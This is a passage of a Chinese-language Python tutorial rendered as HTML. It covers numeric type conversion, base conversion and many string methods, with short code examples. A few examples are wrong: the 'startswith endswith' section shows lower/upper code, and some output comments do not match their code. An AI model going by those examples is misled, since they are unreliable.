python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&#x27;1234&#x27;</span></span><br><span class="line">ret = <span class="built_in">int</span>(s)</span><br><span class="line"><span class="built_in">print</span>(ret,<span class="built_in">type</span>(ret))  <span class="comment"># 1234  &lt;class &#x27;int&#x27;&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span>(<span class="string">&#x27;13.14&#x27;</span>) <span class="comment"># 错误演示：字符串内包含了非整数符号.</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">ValueError: invalid literal <span class="keyword">for</span> <span class="built_in">int</span>() <span class="keyword">with</span> base <span class="number">10</span>: <span class="string">&#x27;13.14&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="（2）进制转换"><a href="#（2）进制转换" class="headerlink" title="（2）进制转换"></a>（2）进制转换</h3><p>十进制转其他进制<br>&#x3D;&#x3D;10进制 —&gt; 2进制&#x3D;&#x3D;</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">res1 = <span class="built_in">bin</span>(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res1)  <span class="comment"># 0b1011</span></span><br></pre></td></tr></table></figure><p>&#x3D;&#x3D;10进制 —&gt; 8进制&#x3D;&#x3D;</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">res2 = <span class="built_in">oct</span>(<span class="number">11</span>)</span><br><span class="line"><span class="built_in">print</span>(res2)  <span class="comment"># 0o13</span></span><br></pre></td></tr></table></figure><p>&#x3D;&#x3D;10进制 —&gt; 16进制&#x3D;&#x3D;</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">res3 = <span class="built_in">hex</span>(<span class="number">11</span>)</span><br><span class="line"><span class="built_in">print</span>(res3)  <span class="comment"># 0xb</span></span><br></pre></td></tr></table></figure><p><strong>其他进制转10进制</strong></p><p>&#x3D;&#x3D;2进制 —&gt; 10进制&#x3D;&#x3D;</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">res4 = <span class="built_in">int</span>(<span class="string">&#x27;11&#x27;</span>, base=<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(res4)   <span class="comment"># 3</span></span><br></pre></td></tr></table></figure><p>&#x3D;&#x3D;8进制 —&gt; 10进制&#x3D;&#x3D;</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">res5 = <span class="built_in">int</span>(<span class="string">&#x27;13&#x27;</span>, base=<span class="number">8</span>)</span><br><span class="line"><span class="built_in">print</span>(res5)   <span class="comment"># 11</span></span><br></pre></td></tr></table></figure><p>&#x3D;&#x3D;16进制 —&gt; 10进制&#x3D;&#x3D;</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">res6 = <span class="built_in">int</span>(<span class="string">&#x27;b&#x27;</span>, base=<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(res6)  <span class="comment"># 11</span></span><br></pre></td></tr></table></figure><p>关于float类型你了解一个类型转换，目前就可以了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">res7 = <span class="built_in">float</span>(<span class="string">&quot;3.14115926&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(res7,<span class="built_in">type</span>(res7))    <span class="comment"># 3.14115926 &lt;class &#x27;float&#x27;&gt; </span></span><br></pre></td></tr></table></figure><h3 id="（3）内置方法"><a href="#（3）内置方法" class="headerlink" title="（3）内置方法"></a>（3）内置方法</h3><p>int和float没有需要掌握的内置方法，他们的使用就是数学运算+比较运算。<br>#三、字符串类型<br>##1、定义</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msg = <span class="string">&#x27;hello&#x27;</span>   <span class="comment"># msg = str(&#x27;hello&#x27;)</span></span><br><span class="line"><span class="built_in">print</span>(msg)       <span class="comment"># hello</span></span><br></pre></td></tr></table></figure><h2 id="2、类型转换-1"><a href="#2、类型转换-1" class="headerlink" title="2、类型转换"></a>2、类型转换</h2><h3 id="（1）str可以把任意其他类型都转成字符串"><a href="#（1）str可以把任意其他类型都转成字符串" class="headerlink" title="（1）str可以把任意其他类型都转成字符串"></a>（1）str可以把任意其他类型都转成字符串</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 数字 --&gt; str</span></span><br><span class="line">num = <span class="number">1234</span></span><br><span class="line">res1 = <span class="built_in">str</span>(num)</span><br><span class="line"><span class="built_in">print</span>(res1)     <span class="comment"># &#x27;1234&#x27; &lt;class &#x27;str&#x27;&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 列表 --&gt; str</span></span><br><span class="line">lst = [<span class="string">&#x27;tom&#x27;</span>,<span class="number">1234</span>,[<span class="string">&#x27;999&#x27;</span>,<span class="number">250</span>],<span class="string">&#x27;shuaibi&#x27;</span>]</span><br><span class="line">res2 = <span class="built_in">str</span>(lst)</span><br><span class="line"><span class="built_in">print</span>(res2,<span class="built_in">type</span>(res2))   <span class="comment"># [&#x27;tom&#x27;,1234,[&#x27;999&#x27;,250],&#x27;shabi&#x27;]  &lt;class &#x27;str&#x27;&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 字典 --&gt; str</span></span><br><span class="line">dic = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;ymn&#x27;</span>&#125;</span><br><span class="line">res3 = <span class="built_in">str</span>(dic)</span><br><span class="line"><span class="built_in">print</span>(res3,<span class="built_in">type</span>(res3))  <span class="comment"># &#123;&#x27;name&#x27;:&#x27;ymn&#x27;&#125;  &lt;class &#x27;str&#x27;&gt;</span></span><br></pre></td></tr></table></figure><h2 id="3、内置方法"><a href="#3、内置方法" class="headerlink" title="3、内置方法"></a>3、内置方法</h2><h3 id="（1）按照索引取值（正向取，反向取）只能取"><a href="#（1）按照索引取值（正向取，反向取）只能取" class="headerlink" title="（1）按照索引取值（正向取，反向取）只能取"></a>（1）按照索引取值（正向取，反向取）只能取</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msg = <span class="string">&quot;lxx love npy&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 正向取</span></span><br><span class="line"><span class="built_in">print</span>(msg[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(msg[<span class="number">5</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 反向取</span></span><br><span class="line"><span class="built_in">print</span>(msg[-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#只能取</span></span><br><span class="line">msg[<span class="number">0</span>] = <span class="string">&quot;H&quot;</span>  <span class="comment"># 报错</span></span><br></pre></td></tr></table></figure><h3 id="（2）切片"><a href="#（2）切片" class="headerlink" title="（2）切片"></a>（2）切片</h3><p>索引的拓展应用，从一个大字符串中拷贝出一个字符串（顾头不顾尾，步长）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msg = <span class="string">&quot;lxx love npy&quot;</span></span><br><span class="line"><span class="comment"># 顾头不顾尾</span></span><br><span class="line">res9 = msg[<span class="number">0</span>:<span class="number">3</span>] <span class="comment"># lxx</span></span><br></pre></td></tr></table></figure><h3 id="（3）步长"><a href="#（3）步长" class="headerlink" title="（3）步长"></a>（3）步长</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msg = <span class="string">&quot;xyg love npy&quot;</span></span><br><span class="line">res = msg[<span class="number">0</span>:<span class="number">7</span>:<span class="number">2</span>] <span class="comment"># 0 2 4 6</span></span><br><span class="line"><span class="built_in">print</span>(res) <span class="comment"># </span></span><br></pre></td></tr></table></figure><h3 id="（4）反向步长"><a href="#（4）反向步长" class="headerlink" title="（4）反向步长"></a>（4）反向步长</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msg = <span class="string">&quot;lxx love npy&quot;</span></span><br><span class="line">res = msg[<span class="number">0</span>:<span class="number">7</span>:-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(res)   <span class="comment"># 空,原因是切片和步长的方向不一致</span></span><br><span class="line"></span><br><span class="line">res = msg[<span class="number">7</span>:<span class="number">0</span>:-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(res)   <span class="comment"># </span></span><br></pre></td></tr></table></figure><h3 id="（5）通过切片拷贝字符串"><a href="#（5）通过切片拷贝字符串" class="headerlink" title="（5）通过切片拷贝字符串"></a>（5）通过切片拷贝字符串</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msg = <span class="string">&quot;lxx love npy&quot;</span></span><br><span class="line">msg1 = msg[<span class="number">0</span>:<span class="number">13</span>]</span><br><span class="line"><span class="built_in">print</span>(msg1)    <span class="comment"># </span></span><br><span class="line">msg2 = msg[:]  <span class="comment"># 不写索引,默认开头:结束</span></span><br><span class="line"><span class="built_in">print</span>(msg2)    <span class="comment"># </span></span><br></pre></td></tr></table></figure><h3 id="（6）把字符串倒过来"><a href="#（6）把字符串倒过来" class="headerlink" title="（6）把字符串倒过来"></a>（6）把字符串倒过来</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#  把字符串倒过来</span></span><br><span class="line">msg = <span class="string">&quot;lxx love npy&quot;</span></span><br><span class="line">msg1 = msg[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(msg1)     <span class="comment"># &#x27;ypn evol xxl&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="（7）长度len"><a href="#（7）长度len" class="headerlink" title="（7）长度len"></a>（7）长度len</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msg = <span class="string">&quot;lxx love npy&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(msg))   <span class="comment"># 12</span></span><br></pre></td></tr></table></figure><h3 id="（8）成员运算in和not-in"><a href="#（8）成员运算in和not-in" class="headerlink" title="（8）成员运算in和not in"></a>（8）成员运算in和not in</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 成员运算in和not in</span></span><br><span class="line"><span class="comment"># 判断一个子字符串是否存在于一个大字符串中</span></span><br><span class="line">msg = <span class="string">&quot;lxx love npy&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ymn&quot;</span> <span class="keyword">in</span> msg)  <span class="comment"># False</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sb&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> msg)  <span class="comment"># True</span></span><br></pre></td></tr></table></figure><h3 id="（9）移除自付出啊左右两侧的符号strip"><a href="#（9）移除自付出啊左右两侧的符号strip" class="headerlink" title="（9）移除自付出啊左右两侧的符号strip"></a>（9）移除自付出啊左右两侧的符号strip</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 默认去掉空格</span></span><br><span class="line">name = <span class="string">&quot;    ymn    &quot;</span></span><br><span class="line">new_name = name.strip()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(name) <span class="comment"># 不会改变原值  &quot;    ymn    &quot;</span></span><br><span class="line"><span class="built_in">print</span>(new_name) <span class="comment"># 是产生了新值 &#x27;ymn&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定去除符号</span></span><br><span class="line">msg = <span class="string">&quot;***有猫腻***&quot;</span></span><br><span class="line">new_msg = msg.strip(<span class="string">&quot;*&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(new_msg) <span class="comment"># 有猫腻</span></span><br></pre></td></tr></table></figure><p>&#x3D;&#x3D;strip只去除两边的，不会去除中间的。&#x3D;&#x3D;<br>因为strip内部是先从字符串的左边开始–比较是不是要取除的符号，如果是就去除，然后继续比较，如果不是就会从字符串的右侧开始–比较是不是要去除的符号，直到不会是要去除的符号，然后停止比较。<br>返回去除后的新值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># strip可以设置多个去除符号</span></span><br><span class="line">msg = <span class="string">&quot;*()-=ymn+++*&amp;^&quot;</span></span><br><span class="line">new_msg = msg.strip(<span class="string">&quot;*()-+=&amp;^&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(new_msg)   <span class="comment"># ymn</span></span><br></pre></td></tr></table></figure><h3 id="（9）分割split"><a href="#（9）分割split" class="headerlink" title="（9）分割split"></a>（9）分割split</h3><p>把字符串按照某种分割符进行切分，得到一个列表，字符串转换成列表的方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">info = <span class="string">&quot;ymn 20 男&quot;</span></span><br><span class="line"><span class="comment"># 默认按照空格分割</span></span><br><span class="line">lst = info.split()</span><br><span class="line"><span class="built_in">print</span>(lst)  <span class="comment"># [&#x27;ymn&#x27;,&#x27;20&#x27;,&#x27;男&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定分隔符</span></span><br><span class="line">info = <span class="string">&quot;ymn:20:男&quot;</span></span><br><span class="line">lst = info.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(lst)  <span class="comment"># [&#x27;ymn&#x27;,&#x27;20&#x27;,&#x27;男&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定分割的次数, 默认是全部分割  (了解)</span></span><br><span class="line">info = <span class="string">&quot;ymn:20:男&quot;</span></span><br><span class="line">lst = info.split(<span class="string">&quot;:&quot;</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(lst)   <span class="comment"># [&#x27;ymn&#x27;,&#x27;20:男&#x27;]</span></span><br></pre></td></tr></table></figure><h3 id="（10）大小写转换lower-upper"><a href="#（10）大小写转换lower-upper" class="headerlink" title="（10）大小写转换lower upper"></a>（10）大小写转换lower upper</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msg = <span class="string">&#x27;aaaBBccDD&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(msg.lower())  <span class="comment"># aaabbccdd,大写转小写</span></span><br><span class="line"><span class="built_in">print</span>(msg.upper())  <span class="comment"># AAABBCCDD,小写转大写</span></span><br></pre></td></tr></table></figure><h3 id="（11）startswith-endswith"><a href="#（11）startswith-endswith" class="headerlink" title="（11）startswith endswith"></a>（11）startswith endswith</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msg = <span class="string">&#x27;aaaBBccDD&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(msg.lower())  <span class="comment"># aaabbccdd,大写转小写</span></span><br><span class="line"><span class="built_in">print</span>(msg.upper())  <span class="comment"># AAABBCCDD,小写转大写</span></span><br></pre></td></tr></table></figure><h3 id="（12）format的三种方式"><a href="#（12）format的三种方式" class="headerlink" title="（12）format的三种方式"></a>（12）format的三种方式</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">m = <span class="string">&quot;lxx&quot;</span></span><br><span class="line">n = <span class="string">&quot;npy&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#123;&#125; love &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(m, n))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#123;0&#125; love &#123;1&#125;&#x27;</span>.<span class="built_in">format</span>(m, n))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#123;m&#125; love &#123;n&#125;&#x27;</span>.<span class="built_in">format</span>(m=m, n=n))</span><br></pre></td></tr></table></figure><h3 id="（13）join拼接"><a href="#（13）join拼接" class="headerlink" title="（13）join拼接"></a>（13）join拼接</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &quot;拼接符&quot;.join(列表/字符串) , 这也是将列表转化为字符串的方式</span></span><br><span class="line"></span><br><span class="line">lst = [<span class="string">&#x27;ymn&#x27;</span>,<span class="string">&#x27;21&#x27;</span>,<span class="string">&#x27;男&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;:&#x27;</span>.join(lst))  <span class="comment"># ymn:21:男</span></span><br><span class="line"></span><br><span class="line">msg = <span class="string">&#x27;ymn&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;nb&#x27;</span>.join(msg)) <span class="comment"># ynbmnbnnb</span></span><br></pre></td></tr></table></figure><h3 id="（14）replace替换"><a href="#（14）replace替换" class="headerlink" title="（14）replace替换"></a>（14）replace替换</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msg = <span class="string">&quot;**ymn**&quot;</span></span><br><span class="line">new_msg = msg.replace(<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;=&#x27;</span>) <span class="comment"># replace(待替换的字符,替换成的字符,替换次数(默认所有))</span></span><br><span class="line"><span class="built_in">print</span>(new_msg)  <span class="comment"># &#x27;==ymn==&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="（15）isdigit"><a href="#（15）isdigit" class="headerlink" title="（15）isdigit"></a>（15）isdigit</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 判断字符串是否全部由数字组成</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;123&#x27;</span>.isdigit())  <span class="comment"># True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;12.3&#x27;</span>.isdigit()) <span class="comment"># False</span></span><br></pre></td></tr></table></figure><h3 id="（16）find-index"><a href="#（16）find-index" class="headerlink" title="（16）find index"></a>（16）find index</h3><p>都是通过字符查找索引，但是find找不到返回-1，index则报错</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msg = <span class="string">&quot;lxx love npy&quot;</span></span><br><span class="line"><span class="built_in">print</span>(msg.find(<span class="string">&quot;n&quot;</span>))  <span class="comment"># 返回要查找的字符串在大字符串中的起始索引 9</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(msg.find(<span class="string">&quot;npy&quot;</span>))  <span class="comment"># 9</span></span><br><span class="line"><span class="built_in">print</span>(msg.find(<span class="string">&quot;s&quot;</span>))  <span class="comment"># -1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># index</span></span><br><span class="line"><span class="built_in">print</span>(msg.index(<span class="string">&quot;s&quot;</span>))  <span class="comment"># 报错</span></span><br></pre></td></tr></table></figure><h3 id="（17）count计数"><a href="#（17）count计数" class="headerlink" title="（17）count计数"></a>（17）count计数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 统计小字符串在大字符串中出现的次数</span></span><br><span class="line">msg = <span class="string">&#x27;lxx love npy&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(msg.count(<span class="string">&#x27;l&#x27;</span>))  <span class="comment"># 2</span></span><br><span class="line"><span class="built_in">print</span>(msg.count(<span class="string">&#x27;lxx&#x27;</span>))  <span class="comment"># 1</span></span><br><span class="line"><span class="built_in">print</span>(msg.count(<span class="string">&#x27;s&#x27;</span>))  <span class="comment"># 0</span></span><br></pre></td></tr></table></figure><h3 id="（18）encode-decode"><a href="#（18）encode-decode" class="headerlink" title="（18）encode decode"></a>（18）encode decode</h3><p>编码和解码，byte类型 字节</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 字符串--&gt;byte类型</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 字符串编码</span></span><br><span class="line">s1 = <span class="string">&quot;你好&quot;</span></span><br><span class="line"><span class="comment"># res1 = s1.encode(&quot;utf-8&quot;)</span></span><br><span class="line">res1 = s1.encode(<span class="string">&quot;gbk&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(res1, <span class="built_in">type</span>(res1))  <span class="comment"># b&#x27;\xe4\xbd\xa0\xe5\xa5\xbd&#x27; &lt;class &#x27;bytes&#x27;&gt;</span></span><br><span class="line">                        <span class="comment"># b&#x27;\xc4\xe3\xba\xc3&#x27; &lt;class &#x27;bytes&#x27;&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 字符串解码</span></span><br><span class="line">b1 = <span class="string">b&#x27;\xe4\xbd\xa0\xe5\xa5\xbd&#x27;</span></span><br><span class="line">res1 = b1.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(res1)  <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">b2 = <span class="string">b&#x27;\xc4\xe3\xba\xc3&#x27;</span></span><br><span class="line">res2 = b2.decode(<span class="string">&quot;gbk&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(res2)  <span class="comment">#</span></span><br></pre></td></tr></table></figure><h3 id="（19）center-ljus-rjust-zfill-控制输出的-了解"><a href="#（19）center-ljus-rjust-zfill-控制输出的-了解" class="headerlink" title="（19）center,ljus,rjust,zfill  控制输出的(了解)"></a>（19）center,ljus,rjust,zfill  控制输出的(了解)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ymn&#x27;</span>.center(<span class="number">20</span>, <span class="string">&#x27;*&#x27;</span>))  <span class="comment"># 显示宽度为20,居中,不够的用&quot;*&quot;填充</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ymn&#x27;</span>.ljust(<span class="number">20</span>, <span class="string">&#x27;*&#x27;</span>))     <span class="comment"># 显示宽度为20,左对齐,不够的用&quot;*&quot;填充</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ymn&#x27;</span>.rjust(<span class="number">20</span>, <span class="string">&#x27;*&#x27;</span>))     <span class="comment"># 显示宽度为20,右对齐,不够的用&quot;*&quot;填充</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ymn&#x27;</span>.zfill(<span class="number">20</span>))            <span class="comment"># 显示宽度为20,用0填充</span></span><br></pre></td></tr></table></figure><h3 id="（20）expandtabs-了解"><a href="#（20）expandtabs-了解" class="headerlink" title="（20）expandtabs(了解)"></a>（20）expandtabs(了解)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 设置制表符代表的空格数</span></span><br><span class="line">msg = <span class="string">&#x27;ymn\tnb&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(msg.expandtabs(<span class="number">2</span>))  <span class="comment"># &#x27;ymn  nb&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="（21）captalize-swapcase-title-了解"><a href="#（21）captalize-swapcase-title-了解" class="headerlink" title="（21）captalize swapcase title (了解)"></a>（21）captalize swapcase title (了解)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ymn&#x27;</span>.capitalize())        <span class="comment"># Ymn    字符串首字母大写</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ymn NB&#x27;</span>.swapcase())  <span class="comment"># YMN nb 字符串大小写翻转</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ymn nb&#x27;</span>.title())            <span class="comment"># Ymn Nb 每个单词首字母大写</span></span><br></pre></td></tr></table></figure><h3 id="（22）-is系列-了解"><a href="#（22）-is系列-了解" class="headerlink" title="（22） is系列(了解)"></a>（22） is系列(了解)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 判断字符串是否是全小写字母组成</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ymn&#x27;</span>.islower()) </span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断字符串是否是全小写字母组成</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;YMN&#x27;</span>.isupper())  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断字符串的每个单词的首字母是否大写</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;lxx love npy&#x27;</span>.istitle()) </span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断字符串是否由数字或字母组成</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Ymn 666&#x27;</span>.isalnum())  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断字符串是否由字母组成</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Ymn&#x27;</span>.isalpha()) </span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断字符串是否由空格组成</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;    &#x27;</span>.isspace())  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断字符串是否符合标识符的命名规范</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Ymn&#x27;</span>.isidentifier())  